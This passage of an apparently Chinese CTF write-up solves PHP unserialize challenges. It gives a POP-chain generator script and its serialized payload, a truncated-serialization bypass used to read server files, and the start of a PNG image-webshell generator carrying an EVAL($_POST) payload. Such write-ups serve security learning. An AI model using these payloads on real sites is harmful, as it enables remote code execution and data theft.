class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">elseif</span>(count(<span class="variable">$matches</span>[<span class="number">1</span>]) == <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable">$destinationFunction</span> = <span class="variable">$matches</span>[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">                    <span class="variable">$extractFunctionContents</span> = <span class="string">&quot;/public function <span class="subst">$destinationFunction</span>\((.*?)\)(.*?)    &#125;/ms&quot;</span>;</span><br><span class="line">                    preg_match_all(<span class="variable">$extractFunctionContents</span>, <span class="variable">$CLASS_FILE</span>, <span class="variable">$functionContent</span>);</span><br><span class="line">                    <span class="variable">$params</span> = <span class="string">&quot;\\&quot;</span> . <span class="variable">$functionContent</span>[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">                    <span class="variable">$extractRightOp</span> = <span class="string">&quot;/<span class="subst">$params</span>=(.*?);/&quot;</span>;</span><br><span class="line">                    preg_match_all(<span class="variable">$extractRightOp</span>, <span class="variable">$functionContent</span>[<span class="number">0</span>][<span class="number">0</span>], <span class="variable">$rightOp</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// eval arg has been padded, invalid.</span></span><br><span class="line">                    <span class="keyword">if</span>(count(<span class="variable">$rightOp</span>[<span class="number">1</span>]) == <span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$isDestination</span> = preg_match(<span class="string">&quot;/eval\((.*?)\);/&quot;</span>, <span class="variable">$functionContent</span>[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">                        &amp;&amp; !preg_match(<span class="string">&quot;/=&#x27;/&quot;</span>, <span class="variable">$functionContent</span>[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$isDestination</span>)&#123;</span><br><span class="line">                        array_push(<span class="variable">$result</span>, GenerateClass(<span class="variable">$class</span>, <span class="variable">$jmpFunction</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">                        file_put_contents(<span class="string">&quot;exp.php&quot;</span>, <span class="string">&quot;&lt;?php&quot;</span> . PHP_EOL . implode(<span class="string">&quot;\n&quot;</span>, <span class="variable">$result</span>) . PHP_EOL . <span class="string">&quot;echo serialize(new PADDING());&quot;</span>);</span><br><span class="line">                        <span class="keyword">die</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$step</span> = FindClassByFunction(<span class="variable">$destinationFunction</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$step</span> != <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                        array_push(<span class="variable">$result</span>, GenerateClass(<span class="variable">$class</span>, <span class="variable">$jmpFunction</span>, <span class="variable">$step</span>));</span><br><span class="line">                        <span class="keyword">if</span>(!BackTrace(<span class="variable">$destinationFunction</span>))&#123;</span><br><span class="line">                            array_pop(<span class="variable">$result</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BackTrace(<span class="string">&quot;yuAp2O&quot;</span>);</span><br></pre></td></tr></table></figure><p>生成的代码整理后如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vPFL76</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;NwyYaGg=<span class="keyword">new</span> KUGigF();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KUGigF</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;yeibvDG=<span class="keyword">new</span> rMo15X();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rMo15X</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;FK5IgDD=<span class="keyword">new</span> cGInXd();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cGInXd</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;pazgAVc=<span class="keyword">new</span> Akn5g6();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Akn5g6</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;HRHFKR3=<span class="keyword">new</span> ox6mgh();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ox6mgh</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;yHSRG7p=<span class="keyword">new</span> UvIezc();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UvIezc</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;G6ci7az=<span class="keyword">new</span> a68xiw();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a68xiw</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;ndGFMQ7=<span class="keyword">new</span> xSroRa();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xSroRa</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;oXHWucx=<span class="keyword">new</span> aCWT05();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aCWT05</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;HGtml2m=<span class="keyword">new</span> yDIcsa();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yDIcsa</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;EQLf6vK=<span class="keyword">new</span> pkszNY();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pkszNY</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;NU3qxgm=<span class="keyword">new</span> tHRECm();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tHRECm</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;niY1imT=<span class="keyword">new</span> xwg8HP();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xwg8HP</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;UPxY7Rh=<span class="keyword">new</span> uwsYxI();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">uwsYxI</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;O6oCtiA=<span class="keyword">new</span> MxQ8vY();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MxQ8vY</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;z4n5cgd=<span class="keyword">new</span> v9zyqI();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">v9zyqI</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;lXmIYTK=<span class="keyword">new</span> ZQTdEz();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZQTdEz</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;tfRml9G=<span class="keyword">new</span> sXLGZq();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sXLGZq</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;pwGsvpx=<span class="keyword">new</span> gdK3FL();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gdK3FL</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;XPiW7lc=<span class="keyword">new</span> Wu1LLY();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wu1LLY</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;SqZ7tgA=<span class="keyword">new</span> e5RFzb();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e5RFzb</span></span>&#123;&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> vPFL76());</span><br></pre></td></tr></table></figure><p>将序列化字符串生成得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;vPFL76&quot;:1:&#123;s:7:&quot;NwyYaGg&quot;;O:6:&quot;KUGigF&quot;:1:&#123;s:7:&quot;yeibvDG&quot;;O:6:&quot;rMo15X&quot;:1:&#123;s:7:&quot;FK5IgDD&quot;;O:6:&quot;cGInXd&quot;:1:&#123;s:7:&quot;pazgAVc&quot;;O:6:&quot;Akn5g6&quot;:1:&#123;s:7:&quot;HRHFKR3&quot;;O:6:&quot;ox6mgh&quot;:1:&#123;s:7:&quot;yHSRG7p&quot;;O:6:&quot;UvIezc&quot;:1:&#123;s:7:&quot;G6ci7az&quot;;O:6:&quot;a68xiw&quot;:1:&#123;s:7:&quot;ndGFMQ7&quot;;O:6:&quot;xSroRa&quot;:1:&#123;s:7:&quot;oXHWucx&quot;;O:6:&quot;aCWT05&quot;:1:&#123;s:7:&quot;HGtml2m&quot;;O:6:&quot;yDIcsa&quot;:1:&#123;s:7:&quot;EQLf6vK&quot;;O:6:&quot;pkszNY&quot;:1:&#123;s:7:&quot;NU3qxgm&quot;;O:6:&quot;tHRECm&quot;:1:&#123;s:7:&quot;niY1imT&quot;;O:6:&quot;xwg8HP&quot;:1:&#123;s:7:&quot;UPxY7Rh&quot;;O:6:&quot;uwsYxI&quot;:1:&#123;s:7:&quot;O6oCtiA&quot;;O:6:&quot;MxQ8vY&quot;:1:&#123;s:7:&quot;z4n5cgd&quot;;O:6:&quot;v9zyqI&quot;:1:&#123;s:7:&quot;lXmIYTK&quot;;O:6:&quot;ZQTdEz&quot;:1:&#123;s:7:&quot;tfRml9G&quot;;O:6:&quot;sXLGZq&quot;:1:&#123;s:7:&quot;pwGsvpx&quot;;O:6:&quot;gdK3FL&quot;:1:&#123;s:7:&quot;XPiW7lc&quot;;O:6:&quot;Wu1LLY&quot;:1:&#123;s:7:&quot;SqZ7tgA&quot;;O:6:&quot;e5RFzb&quot;:0:&#123;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>发送含有载荷的请求即可获得 flag。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623642251074/d19177d6d106405812c88903810415d786cbdda5.png" alt="image-20210614114407478"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;85e385d3-46be-4e29-b005-3e54f85d2370&#125;</span><br></pre></td></tr></table></figure><h3 id="WhereIsUWebShell"><a href="#WhereIsUWebShell" class="headerlink" title="WhereIsUWebShell"></a>WhereIsUWebShell</h3><p>题目给出了如下源代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- You may need to know what is in e2a7106f1cc8bb1e1318df70aa0a3540.php--&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// index.php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;on&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;ctfer&#x27;</span>]))&#123;</span><br><span class="line">    setcookie(<span class="string">&quot;ctfer&quot;</span>,serialize(<span class="string">&quot;ctfer&quot;</span>),time()+<span class="number">3600</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;I see your Cookie&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;ctfer&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/myclass/i&#x27;</span>,serialize(<span class="variable">$res</span>)))&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error: Class &#x27;myclass&#x27; not found &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">highlight_file(<span class="string">&quot;myclass.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">highlight_file(<span class="string">&quot;function.php&quot;</span>);</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// myclass.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;qwb) <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;qwb);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// function.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&quot;/var/www/html/<span class="subst">$classname</span>.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很容易看出反序列化读文件，关键在于后面 <code>myclass</code> 的正则过滤。此时只有让 <code>$res</code> 不存在，再次序列化的字符串里才能没有这个类。在 PHP 的手册中有如下描述。</p><blockquote><p>如果传递的字符串不可反序列化，则返回 **<code>false</code>**，并产生一个 **<code>E_NOTICE</code>**。</p></blockquote><p>因此，我们只需要让反序列化进行到一半就失败即可。尝试修改序列化字符串的最后几个字符即可达成目的。使用如下脚本构造读取文件的载荷。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// trigger the include of myclass.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myclass</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$triggerHello</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;triggerHello = <span class="keyword">new</span> Hello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwb</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;qwb = <span class="string">&quot;e2a7106f1cc8bb1e1318df70aa0a3540.php&quot;</span>; <span class="comment">// read file</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> substr(urlencode(serialize(<span class="keyword">new</span> myclass())), <span class="number">0</span>, -<span class="number">6</span>);</span><br></pre></td></tr></table></figure><p>脚本将生成的序列化字符串的最后两个 <code>&#125;</code> ，此时序列化会成功读取文件，但是最终会失败，从而绕过了后面的正则。读取到了如下文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;bff139fa05ac583f685a523ab3d110a0.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;45b963397aa40d4a0063e0d85e4fe7a1.php&quot;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;119ef9cf-b19b-4bff-90ea-c6bb9b30b2ce&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;119ef9cf-b19b-4bff-90ea-c6bb9b30b2ce&#x27;</span>]:<span class="string">&quot;404.html&quot;</span>;</span><br><span class="line"><span class="variable">$flag</span> = preg_match(<span class="string">&quot;/tmp/i&quot;</span>,<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span>)&#123;</span><br><span class="line">    PNG(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$res</span> = @scandir(<span class="variable">$_GET</span>[<span class="string">&#x27;00b5e1f9-4831-4af6-bd3c-2472bdcf7d5b&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;00b5e1f9-4831-4af6-bd3c-2472bdcf7d5b&#x27;</span>])&amp;&amp;<span class="variable">$_GET</span>[<span class="string">&#x27;00b5e1f9-4831-4af6-bd3c-2472bdcf7d5b&#x27;</span>]===<span class="string">&#x27;/tmp&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$somthing</span> = GenFiles();</span><br><span class="line">    <span class="variable">$res</span> = array_merge(<span class="variable">$res</span>,<span class="variable">$somthing</span>);</span><br><span class="line">&#125;</span><br><span class="line">shuffle(<span class="variable">$res</span>);</span><br><span class="line">@print_r(<span class="variable">$res</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很容易发现其有列出目录的功能。除此之外可以以同样的方式将其中 include 的文件读出。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bff139fa05ac583f685a523ab3d110a0.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">PNG</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!is_file(<span class="variable">$file</span>))&#123;<span class="keyword">die</span>(<span class="string">&quot;我从来没有见过侬&quot;</span>);&#125;</span><br><span class="line">    <span class="variable">$first</span> = imagecreatefrompng(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$first</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;发现了奇怪的东西2333&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$size</span> = min(imagesx(<span class="variable">$first</span>), imagesy(<span class="variable">$first</span>));</span><br><span class="line">    unlink(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$second</span> = imagecrop(<span class="variable">$first</span>, [<span class="string">&#x27;x&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;width&#x27;</span> =&gt; <span class="variable">$size</span>, <span class="string">&#x27;height&#x27;</span> =&gt; <span class="variable">$size</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$second</span> !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        imagepng(<span class="variable">$second</span>, <span class="variable">$file</span>);</span><br><span class="line">        imagedestroy(<span class="variable">$second</span>);<span class="comment">//销毁，清内存</span></span><br><span class="line">    &#125;</span><br><span class="line">    imagedestroy(<span class="variable">$first</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//45b963397aa40d4a0063e0d85e4fe7a1.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GenFiles</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$files</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$len</span>=strlen(<span class="variable">$str</span>)-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">10</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$filename</span>=<span class="string">&quot;php&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">6</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$filename</span>  .= <span class="variable">$str</span>[rand(<span class="number">0</span>,<span class="variable">$len</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// file_put_contents(&#x27;/tmp/&#x27;.$filename,&#x27;flag&#123;fake_flag&#125;&#x27;);</span></span><br><span class="line">        <span class="variable">$files</span>[] = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$files</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现其中 <code>PNG</code> 函数对传入的文件进行了重渲染操作。<code>/tmp</code> 下的文件将被传给 <code>PNG</code> 重渲染后直接包含。<code>GenFiles</code> 则是生成假的文件字符串来混淆视听，由于是强等于的判断 <code>===&#39;/tmp&#39;</code>，直接用 <code>/tmp/</code> 即可绕过这个函数的执行。而二次渲染的图片马可以借由 <code>PNG-IDAT-Payload-Generator</code> 写出如下脚本来生成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">PAYLOAD_LENGTH = <span class="number">20</span></span><br><span class="line"><span class="comment"># PAYLOAD = &quot;(\&quot;PHP\&quot;.\&quot;INFO\&quot;)()&quot;</span></span><br><span class="line">PAYLOAD = <span class="string">&quot;EVAL($_POST[\&quot;ZIT\&quot;])&quot;</span></span><br><span class="line">DEFAULT_COMPRESSED_STRING = <span class="string">b&quot;\xa3\x9f\x67\x54\x6f\x2c\x24\x15\x2b\x11\x67\x12\x54\x6f\x11\x2e\x29\x15\x2b\x21\x67\x22\x6b\x6f\x5f\x53\x10&quot;</span></span><br><span class="line">ENV = <span 